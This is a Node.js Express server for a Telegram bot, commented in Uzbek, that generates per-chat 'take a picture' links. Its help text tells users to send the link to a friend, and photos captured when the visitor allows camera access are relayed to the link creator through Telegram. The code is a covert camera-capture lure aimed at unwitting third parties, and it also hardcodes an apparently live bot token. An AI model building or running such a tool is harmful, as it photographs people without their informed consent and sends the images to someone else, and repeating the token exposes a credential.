import express from "express";
import TelegramBot from "node-telegram-bot-api";
import path from "path";
import { fileURLToPath } from "url";
import multer from "multer";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ Bot token va baza URL
const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA"; // o'z tokeningni yoz
const BASE_URL = "https://korish.onrender.com";

// ✅ Botni webhook bilan sozlaymiz
const bot = new TelegramBot(TOKEN, { webHook: true });
bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);

// ✅ Tugmalar
const buttons = {
  reply_markup: {
    keyboard: [
      [{ text: "📸 Rasm olish" }, { text: "📢 Kanal" }],
      [{ text: "🆘 Yordam" }],
    ],
    resize_keyboard: true,
  },
};

// ✅ Webhook endpoint
app.use(express.json());
app.post(`/bot${TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ✅ /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `Salom ${msg.from.first_name}! Botga xush kelibsiz!\n\nRasm olish uchun pastdagi tugmadan foydalaning.`,
    buttons
  );
});

// ✅ Tugmalar
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === "📸 Rasm olish") {
    const url = `${BASE_URL}/selfie/${chatId}`;
    bot.sendMessage(
      chatId,
      `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
    );
  } else if (text === "📢 Kanal") {
    bot.sendMessage(
      chatId,
      "*Kanalga qo‘shilish uchun pastdagi tugmani bosing.*",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📢 Kanalga qo‘shilish",
                url: "https://t.me/koryapman_bot",
              },
            ],
          ],
        },
      }
    );
  } else if (text === "🆘 Yordam") {
    bot.sendMessage(
      chatId,
      "📸 *Rasm olish* tugmasini bosing va linkni do‘stingizga yuboring.\n\nAgar kamera ruxsatiga rozilik bildirilsa — sizga rasm keladi.",
      { parse_mode: "Markdown" }
    );
  }
});

// ✅ Selfie sahifa
app.get("/selfie/:id", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ Rasm yuklash (brauzer → server → bot)
const upload = multer({ dest: "uploads/" });
app.post("/upload", upload.single("photo"), async (req, res) => {
  const { chatId } = req.body;
  const filePath = req.file.path;

  try {
    await bot.sendPhoto(chatId, fs.createReadStream(filePath), {
      caption: "📸 Foydalanuvchi rasmi olindi ✅",
    });
    fs.unlinkSync(filePath); // vaqtinchalik faylni o‘chirish
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.json({ ok: false });
  }
});

// ✅ Serverni ishga tushiramiz
app.listen(PORT, () => {
  console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
});
